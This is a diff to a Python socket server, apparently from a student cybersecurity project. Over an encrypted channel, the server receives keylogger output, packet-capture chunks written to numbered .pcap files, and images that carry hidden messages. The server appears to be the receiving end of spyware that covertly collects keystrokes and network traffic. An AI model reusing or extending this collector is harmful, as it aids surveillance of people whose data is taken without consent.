@@ -16,7 +16,7 @@ CLOSE_CON_MSG = 'Connection with client closed.'
 class Server:
     def __init__(self):
         try:
-            self.dh =pyDH.DiffieHellman()
+            self.dh = pyDH.DiffieHellman()
             self.private_key = self.dh.get_private_key()
             self.public_key = self.dh.gen_public_key()
             self.shared_key = None
@@ -24,8 +24,9 @@ class Server:
             self.result = ''
             self.cond = True
             self.total_data = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
-            self.pcap_data = b''
+            self.pcap_data = b'\xD4\xC3\xB2\xA1\x02\x00\x04\x00'
             self.connections = []
+            self.pcap_fila_num = 1
             # self.result += EncodeImg.restor_message('1.png')
         except ValueError as e:
             print("Cannot initialized")
@@ -82,12 +83,13 @@ class Server:
                         time.sleep(1)
                         cipher_text = cipher.encrypt('4 Thanks')
                         client_socket.send(cipher_text)
-                    elif data[:1] == b'5' or data[:1] == '5':
+                    elif data[:1] == '5' or data[:1] == b'5':
                         if data == '5finish':
-                            new_file = open("C:\\Users\\Moshe\\Desktop\\CyberPlan\\FinalProject\\FinalProject\\FinalProjectPy\\1.png1.png", "wb")
+                            self.total_data += b'\x82'
+                            new_file = open("1.png", "wb")
                             # write to file
                             new_file.write(self.total_data)
-                            new_file.close()
+                            # new_file.close()
                             self.total_data = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
                             self.result += EncodeImg.restor_message('1.png').strip()
                         else:
@@ -98,15 +100,15 @@ class Server:
                         self.result += "Key logger sent: {}".format(data_decrypt.decode('utf-8', 'ignore'))
                     elif data[:1] == b'7' or data[:1] == '7':
                         if data == '7finish':
-                            new_file = open("1.pcap", "wb")
+                            new_file = open("{}.pcap".format(str(self.pcap_fila_num)), "wb")
+                            self.pcap_fila_num += 1
                             # write to file
-                            new_file.write(self.total_data)
+                            new_file.write(self.pcap_data)
                             new_file.close()
-                            self.pcap_data = b''
+                            self.pcap_data = b'\xD4\xC3\xB2\xA1\x02\x00\x04\x00'
                             self.result += "pcap file was dumped"
                         else:
-                            self.total_data += data[1:]
-
+                            self.pcap_data += data[1:]
 
             except socket.timeout:
                 print(CLOSE_CON_MSG)
@@ -125,6 +127,6 @@ class Server:
             except Exception as e:
                 client_socket.close()
                 return
-            # if not t.is_alive():
-            # print(CLOSE_CON_MSG)
-            # client_socket.close()
+                # if not t.is_alive():
+                # print(CLOSE_CON_MSG)
+                # client_socket.close()
